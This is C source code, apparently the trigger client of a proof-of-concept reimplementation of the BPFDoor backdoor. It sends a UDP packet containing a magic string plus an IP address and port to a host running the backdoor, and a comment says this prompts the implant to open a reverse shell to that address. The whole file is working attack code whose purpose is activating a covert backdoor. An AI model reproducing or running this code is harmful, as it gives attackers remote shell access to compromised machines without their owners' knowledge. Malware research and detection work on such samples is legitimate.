#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

#include "shared.h"

int main (int argc, char *argv[])
{
	struct sockaddr_in sin;
	int sin_len = sizeof (sin);
	int sock;

	char *srv_ip = SERVER_IP;
	char *srv_port = STR(REVERSE_SHELL_PORT);
	char payload[32];
	int payload_len = 32;

	if (argc >= 2) {
		srv_ip = argv[1];
	}
	if (argc >= 3) {
		srv_port = argv[2];
	}

	// build payload
	payload_len = snprintf(payload, payload_len, "%s%s:%s", MAGIC_STR, srv_ip, srv_port);
	payload_len += 1; // include null byte

	if ((sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
	{
		perror("error opening socket");
		exit(1);
	}

	memset ((char *) &sin, 0, sizeof (sin));
	sin.sin_family = AF_INET;
	
	// bpfdoorpoc ip & port
	sin.sin_port = htons (SERVER_PORT);
	inet_aton (srv_ip, &sin.sin_addr);

	fprintf(stderr, "Sending payload to %s:%i\n", srv_ip, SERVER_PORT);
	
	// magicbyte + target-ip:port for bpfdoorpoc to reverse shell
	if ((sendto (sock, payload, payload_len, 0, (struct sockaddr *) &sin, sin_len)) < 0)
	{
		perror("error sending data");
		exit(1);
	}

	printf("Sent payload: %s\n", payload);
	return 0;
}
